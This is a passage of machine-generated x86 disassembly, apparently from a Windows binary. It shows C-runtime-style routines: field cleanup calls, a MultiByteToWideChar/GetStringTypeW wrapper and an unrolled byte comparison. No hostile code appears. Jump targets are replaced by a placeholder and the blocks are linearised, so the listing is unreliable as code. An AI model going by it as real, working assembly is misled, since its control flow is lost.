call sub_40f402
push [ esi + 0xc0 ]
call sub_40f402
push [ esi + 0xc4 ]
call sub_40f402
push [ esi + 0xc8 ]
call sub_40f402
add esp 0x40
push [ esi + 0xcc ]
call sub_40f402
push [ esi + 0xb4 ]
call sub_40f402
push [ esi + 0xd4 ]
call sub_40f402
push [ esi + 0xd8 ]
call sub_40f402
push [ esi + 0xdc ]
call sub_40f402
push [ esi + 0xe0 ]
call sub_40f402
push [ esi + 0xe4 ]
call sub_40f402
push [ esi + 0xe8 ]
call sub_40f402
push [ esi + 0xd0 ]
call sub_40f402
push [ esi + 0xec ]
call sub_40f402
push [ esi + 0xf0 ]
call sub_40f402
push [ esi + 0xf4 ]
call sub_40f402
push [ esi + 0xf8 ]
call sub_40f402
push [ esi + 0xfc ]
call sub_40f402
push [ esi + 0x100 ]
call sub_40f402
push [ esi + 0x104 ]
call sub_40f402
add esp 0x40
push [ esi + 0x108 ]
call sub_40f402
push [ esi + 0x10c ]
call sub_40f402
push [ esi + 0x110 ]
call sub_40f402
push [ esi + 0x114 ]
call sub_40f402
push [ esi + 0x118 ]
call sub_40f402
push [ esi + 0x11c ]
call sub_40f402
push [ esi + 0x120 ]
call sub_40f402
push [ esi + 0x124 ]
call sub_40f402
push [ esi + 0x128 ]
call sub_40f402
push [ esi + 0x12c ]
call sub_40f402
push [ esi + 0x130 ]
call sub_40f402
push [ esi + 0x134 ]
call sub_40f402
push [ esi + 0x138 ]
call sub_40f402
push [ esi + 0x13c ]
call sub_40f402
push [ esi + 0x140 ]
call sub_40f402
push [ esi + 0x144 ]
call sub_40f402
add esp 0x40
push [ esi + 0x148 ]
call sub_40f402
push [ esi + 0x14c ]
call sub_40f402
push [ esi + 0x150 ]
call sub_40f402
push [ esi + 0x154 ]
call sub_40f402
push [ esi + 0x158 ]
call sub_40f402
push [ esi + 0x15c ]
call sub_40f402
push [ esi + 0x160 ]
call sub_40f402
add esp 0x1c
sub_41ba31
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x1c ]
push ebx
push esi
push edi
xor edi edi
test ecx ecx
jne r-xdata
xor eax eax
cmp [ ebp + 0x20 ] eax
push edi
push edi
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push ecx
call [ MultiByteToWideChar@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
mov ecx eax
jle r-xdata
xor eax eax
jmp r-xdata
mov esi edi
cmp ebx 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40eb9e
leave
retn
lea eax [ ebx + ebx ]
push eax
push edi
push esi
call sub_414c70
add esp 0xc
push ebx
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x1c ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
lea eax [ ebx * 2 + 0x8 ]
cmp eax 0x400
ja r-xdata
push esi
call sub_410a6b
pop ecx
mov eax edi
push [ ebp + 0x18 ]
push eax
push esi
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
mov edi eax
push eax
call sub_40f43a
mov esi eax
pop ecx
test esi esi
je r-xdata
call sub_4173e0
mov esi esp
test esi esi
je r-xdata
mov [ esi ] 0xdddd
mov [ esi ] 0xcccc
jmp r-xdata
test esi esi
je r-xdata
add esi 0x8
jmp r-xdata
sub_41bb1d
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_410368
push [ ebp + 0x20 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_41ba31
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_41bb5b
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
mov eax ebx
push esi
sub eax 0x0
je r-xdata
xor eax eax
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
movzx ecx [ eax ]
mov eax [ ebp + 0xc ]
movzx eax [ eax ]
jmp r-xdata
dec eax
je r-xdata
sub ecx eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx ecx [ edx ]
movzx eax [ esi ]
sub ecx eax
je r-xdata
dec eax
je r-xdata
mov eax ecx
jmp r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
movzx ecx [ edx + 0x1 ]
movzx eax [ esi + 0x1 ]
jmp r-xdata
xor eax eax
test ecx ecx
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx ecx [ edx ]
movzx eax [ esi ]
sub ecx eax
je r-xdata
mov edx [ ebp + 0xc ]
dec eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
movzx ecx [ edx + 0x1 ]
movzx eax [ esi + 0x1 ]
sub ecx eax
je r-xdata
xor eax eax
test ecx ecx
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx eax [ edx ]
movzx esi [ ecx ]
sub esi eax
je r-xdata
mov esi [ ebp + 0x8 ]
push edi
cmp ebx 0x20
jb r-xdata
movzx ecx [ edx + 0x2 ]
movzx eax [ esi + 0x2 ]
jmp r-xdata
xor eax eax
test ecx ecx
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx + 0x1 ]
movzx eax [ edx + 0x1 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
add esi ebx
add edx ebx
cmp ebx 0x1f
ja r-xdata
mov eax [ esi ]
cmp eax [ edx ]
je r-xdata
movzx esi [ ecx + 0x2 ]
movzx eax [ edx + 0x2 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
xor ecx ecx
jmp [ ebx * 4 + jump_table_41d253 ]
xor ecx ecx
movzx edi al
movzx eax [ edx ]
sub edi eax
je r-xdata
movzx ecx [ ecx + 0x3 ]
movzx eax [ edx + 0x3 ]
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov eax [ esi - 0x1c ]
cmp eax [ edx - 0x1c ]
je r-xdata
mov eax [ esi - 0x18 ]
cmp eax [ edx - 0x18 ]
je r-xdata
mov eax [ esi - 0x14 ]
cmp eax [ edx - 0x14 ]
je r-xdata
mov eax [ esi - 0x10 ]
cmp eax [ edx - 0x10 ]
je r-xdata
mov eax [ esi - 0xc ]
cmp eax [ edx - 0xc ]
je r-xdata
mov eax [ esi - 0x8 ]
cmp eax [ edx - 0x8 ]
je r-xdata
mov eax [ esi - 0x4 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ esi - 0x1d ]
cmp eax [ edx - 0x1d ]
je r-xdata
mov eax [ esi - 0x19 ]
cmp eax [ edx - 0x19 ]
je r-xdata
mov eax [ esi - 0x15 ]
cmp eax [ edx - 0x15 ]
je r-xdata
mov eax [ esi - 0x11 ]
cmp eax [ edx - 0x11 ]
je r-xdata
mov eax [ esi - 0xd ]
cmp eax [ edx - 0xd ]
je r-xdata
mov eax [ esi - 0x9 ]
cmp eax [ edx - 0x9 ]
je r-xdata
mov eax [ esi - 0x5 ]
cmp eax [ edx - 0x5 ]
je r-xdata
movzx eax [ edx - 0x1 ]
movzx ecx [ esi - 0x1 ]
sub ecx eax
je r-xdata
mov eax [ esi - 0x1e ]
cmp eax [ edx - 0x1e ]
je r-xdata
mov eax [ esi - 0x1a ]
cmp eax [ edx - 0x1a ]
je r-xdata
mov eax [ esi - 0x16 ]
cmp eax [ edx - 0x16 ]
je r-xdata
mov eax [ esi - 0x12 ]
cmp eax [ edx - 0x12 ]
je r-xdata
mov eax [ esi - 0xe ]
cmp eax [ edx - 0xe ]
je r-xdata
mov eax [ esi - 0xa ]
cmp eax [ edx - 0xa ]
je r-xdata
mov eax [ esi - 0x6 ]
cmp eax [ edx - 0x6 ]
je r-xdata
mov ax [ esi - 0x2 ]
cmp ax [ edx - 0x2 ]
je r-xdata
mov eax [ esi - 0x1f ]
cmp eax [ edx - 0x1f ]
je r-xdata
mov eax [ esi - 0x1b ]
cmp eax [ edx - 0x1b ]
je r-xdata
mov eax [ esi - 0x17 ]
cmp eax [ edx - 0x17 ]
je r-xdata
mov eax [ esi - 0x13 ]
cmp eax [ edx - 0x13 ]
je r-xdata
mov eax [ esi - 0xf ]
cmp eax [ edx - 0xf ]
je r-xdata
mov eax [ esi - 0xb ]
cmp eax [ edx - 0xb ]
je r-xdata
mov eax [ esi - 0x7 ]
cmp eax [ edx - 0x7 ]
je r-xdata
movzx edi [ esi - 0x3 ]
movzx eax [ edx - 0x3 ]
sub edi eax
je r-xdata
mov eax ecx
pop edi
jmp r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
movzx edi [ esi + 0x1 ]
movzx eax [ edx + 0x1 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1c ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x18 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x14 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x10 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx eax [ edx - 0xc ]
movzx edi [ esi - 0xc ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x8 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x4 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1d ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x19 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x15 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x11 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0xd ]
sub edi eax
je r-xdata
xor ecx ecx
movzx eax [ edx - 0x9 ]
movzx edi [ esi - 0x9 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x5 ]
sub edi eax
je r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1e ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1a ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x16 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x12 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0xe ]
sub edi eax
je r-xdata
xor ecx ecx
movzx eax [ edx - 0xa ]
movzx edi [ esi - 0xa ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x6 ]
sub edi eax
je r-xdata
jmp r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1f ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1b ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x17 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x13 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx eax [ edx - 0xf ]
movzx edi [ esi - 0xf ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0xb ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x7 ]
sub edi eax
je r-xdata
movzx eax [ edx - 0x2 ]
movzx edi [ esi - 0x2 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0x4 ]
sub edi eax
je r-xdata
movzx edi [ esi + 0x2 ]
movzx eax [ edx + 0x2 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1b ]
movzx eax [ edx - 0x1b ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x17 ]
movzx eax [ edx - 0x17 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x13 ]
movzx eax [ edx - 0x13 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xf ]
movzx eax [ edx - 0xf ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xb ]
movzx eax [ edx - 0xb ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x7 ]
movzx eax [ edx - 0x7 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x3 ]
movzx eax [ edx - 0x3 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1c ]
movzx eax [ edx - 0x1c ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x18 ]
movzx eax [ edx - 0x18 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x14 ]
movzx eax [ edx - 0x14 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x10 ]
movzx eax [ edx - 0x10 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xc ]
movzx eax [ edx - 0xc ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x8 ]
movzx eax [ edx - 0x8 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x4 ]
movzx eax [ edx - 0x4 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1d ]
movzx eax [ edx - 0x1d ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x19 ]
movzx eax [ edx - 0x19 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x15 ]
movzx eax [ edx - 0x15 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x11 ]
movzx eax [ edx - 0x11 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xd ]
movzx eax [ edx - 0xd ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x9 ]
movzx eax [ edx - 0x9 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x5 ]
movzx eax [ edx - 0x5 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1e ]
movzx eax [ edx - 0x1e ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1a ]
movzx eax [ edx - 0x1a ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x16 ]
movzx eax [ edx - 0x16 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x12 ]
movzx eax [ edx - 0x12 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xe ]
movzx eax [ edx - 0xe ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xa ]
movzx eax [ edx - 0xa ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x6 ]
movzx eax [ edx - 0x6 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
jmp r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ edx + 0x8 ]
je r-xdata
movzx edi [ esi + 0x5 ]
movzx eax [ edx + 0x5 ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0x3 ]
movzx eax [ edx + 0x3 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1a ]
movzx eax [ edx - 0x1a ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x16 ]
movzx eax [ edx - 0x16 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x12 ]
movzx eax [ edx - 0x12 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xe ]
movzx eax [ edx - 0xe ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xa ]
movzx eax [ edx - 0xa ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x6 ]
movzx eax [ edx - 0x6 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x2 ]
movzx eax [ edx - 0x2 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1b ]
movzx eax [ edx - 0x1b ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x17 ]
movzx eax [ edx - 0x17 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x13 ]
movzx eax [ edx - 0x13 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xf ]
movzx eax [ edx - 0xf ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xb ]
movzx eax [ edx - 0xb ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x7 ]
movzx eax [ edx - 0x7 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x3 ]
movzx eax [ edx - 0x3 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1c ]
movzx eax [ edx - 0x1c ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x18 ]
movzx eax [ edx - 0x18 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x14 ]
movzx eax [ edx - 0x14 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x10 ]
movzx eax [ edx - 0x10 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xc ]
movzx eax [ edx - 0xc ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x8 ]
movzx eax [ edx - 0x8 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x4 ]
movzx eax [ edx - 0x4 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1d ]
movzx eax [ edx - 0x1d ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x19 ]
movzx eax [ edx - 0x19 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x15 ]
movzx eax [ edx - 0x15 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x11 ]
movzx eax [ edx - 0x11 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xd ]
movzx eax [ edx - 0xd ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x9 ]
movzx eax [ edx - 0x9 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x5 ]
movzx eax [ edx - 0x5 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0x8 ]
sub edi eax
je r-xdata
movzx edi [ esi + 0x6 ]
movzx eax [ edx + 0x6 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
movzx ecx [ esi - 0x19 ]
movzx eax [ edx - 0x19 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x15 ]
movzx eax [ edx - 0x15 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x11 ]
movzx eax [ edx - 0x11 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xd ]
movzx eax [ edx - 0xd ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x9 ]
movzx eax [ edx - 0x9 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x5 ]
movzx eax [ edx - 0x5 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x1 ]
movzx eax [ edx - 0x1 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x1a ]
movzx eax [ edx - 0x1a ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x16 ]
movzx eax [ edx - 0x16 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x12 ]
movzx eax [ edx - 0x12 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xe ]
movzx eax [ edx - 0xe ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xa ]
movzx eax [ edx - 0xa ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x6 ]
movzx eax [ edx - 0x6 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x2 ]
movzx eax [ edx - 0x2 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x1b ]
movzx eax [ edx - 0x1b ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x17 ]
movzx eax [ edx - 0x17 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
